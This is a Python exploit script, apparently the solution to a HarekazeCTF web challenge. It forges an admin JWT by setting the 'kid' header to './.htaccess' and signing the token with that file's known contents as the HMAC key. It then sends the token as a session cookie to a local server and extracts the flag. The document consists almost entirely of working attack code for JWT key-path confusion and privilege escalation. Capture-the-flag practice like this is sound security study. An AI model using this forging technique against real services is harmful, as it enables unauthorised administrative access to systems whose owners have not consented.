import requests
import base64
import hmac, json, os, re
import hashlib

url = "http://127.0.0.1:8000/"

def b64encode(obj):
    return base64.urlsafe_b64encode(obj).replace(b'=', b'')

header = {
  'typ': 'JWT',
  'kid': './.htaccess',
  'alg': 'HS256'
}
data = {
  'username': 'admin',
  'role': 'admin'
}
secret = b'deny from all'

signing_input = b64encode(json.dumps(header).encode()) + b'.' + b64encode(json.dumps(data).encode())
signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
jwt = signing_input + b'.' + b64encode(signature)

response = requests.get(url + '?page=admin', cookies={
    'jwtsession': jwt.decode()
})
flag = re.findall(r'(HarekazeCTF\{.+?\})', response.content.decode())[0]
print(f"[+] Here Flag: \n{flag}")